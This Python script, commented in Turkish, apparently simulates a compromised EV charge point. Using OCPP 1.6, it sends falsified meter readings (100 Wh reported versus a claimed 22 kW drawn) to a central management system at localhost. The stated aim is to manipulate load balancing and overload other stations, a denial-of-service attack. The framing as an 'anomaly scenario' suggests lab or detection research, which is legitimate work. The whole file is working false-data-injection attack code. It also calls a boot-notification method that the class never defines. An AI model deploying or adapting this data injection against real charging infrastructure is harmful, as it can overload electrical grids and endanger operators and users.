import asyncio
import logging
import can
import websockets
from datetime import datetime, timezone

from ocpp.v16 import ChargePoint as cp, call, call_result
from ocpp.v16.enums import RegistrationStatus, RemoteStartStopStatus
from ocpp.routing import on

# Loglama formatını ayarlayalım
logging.basicConfig(level=logging.INFO, format='%(asctime)s - [SALDIRGAN CP] - %(message)s')

class AttackerChargePoint(cp):

    async def send_meter_values(self):
        """ 
        ANOMALİ SENARYOSU: Yük Dengeleme Algoritmasını Manipüle Etme
        Amaç: Gerçekte yüksek güç çekerken, düşük güç raporlayarak 
        CSMS'in diğer istasyonlara aşırı yük bindirmesini sağlamak (DoS).
        """
        
        # SALDIRI PARAMETRELERİ
        GERCEK_TUKETIM = 22000  # Wh (Fiziksel olarak çekilen devasa güç - 22kW)
        SAHTE_RAPOR = 100       # Wh (Merkeze söylenen yalan - 0.1kW)
        
        logging.info(f"--- SALDIRI BAŞLATILIYOR ---")
        logging.info(f"Fiziksel Durum: {GERCEK_TUKETIM}W çekiliyor (Tehlikeli Düzey)")
        logging.info(f"Strateji: Düşük raporlayıp kapasiteyi başkasına kullandırtmak.")

        while True:
            # 1. Adım: Sahte Veri Hazırla
            payload = [{
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "sampled_value": [{
                    "value": str(SAHTE_RAPOR), # YALAN VERİ
                    "context": "Sample.Periodic",
                    "measurand": "Energy.Active.Import.Register",
                    "unit": "Wh"
                }]
            }]
            
            # 2. Adım: Veriyi Gönder ve Logla
            try:
                # Loglarda gerçek durumu vs gönderilen yalanı kıyaslayalım
                logging.warning(f"⚠️ MANİPÜLASYON: Gerçek Tüketim: {GERCEK_TUKETIM}W | Gönderilen Rapor: {SAHTE_RAPOR}W")
                
                await self.call(call.MeterValues(connector_id=1, meter_value=payload))
                
            except Exception as e:
                logging.error(f"Gönderim hatası: {e}")
            
            # 5 saniyede bir raporla
            await asyncio.sleep(5) 

    @on('RemoteStartTransaction')
    async def on_remote_start(self, id_tag, **kwargs):
        logging.info(f"Komut Alındı: Başlat ({id_tag}) - Tam Güç Çekmeye Başlanıyor...")
        return call_result.RemoteStartTransaction(status=RemoteStartStopStatus.accepted)

    @on('RemoteStopTransaction')
    async def on_remote_stop(self, transaction_id, **kwargs):
        logging.info(f"Komut Alındı: Durdur ({transaction_id})")
        return call_result.RemoteStopTransaction(status=RemoteStartStopStatus.accepted)

async def main():
    async with websockets.connect('ws://localhost:9000/CHARGER-001', subprotocols=['ocpp1.6']) as ws:
        logging.info("CSMS'e Bağlanıldı (Firmware Hacklendi - Root Yetkisi)")
        client = AttackerChargePoint('CHARGER-001', ws)
        
        await asyncio.gather(
            client.start(),
            client.send_boot_notification(),
            client.send_meter_values() # Saldırıyı başlat
        )

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass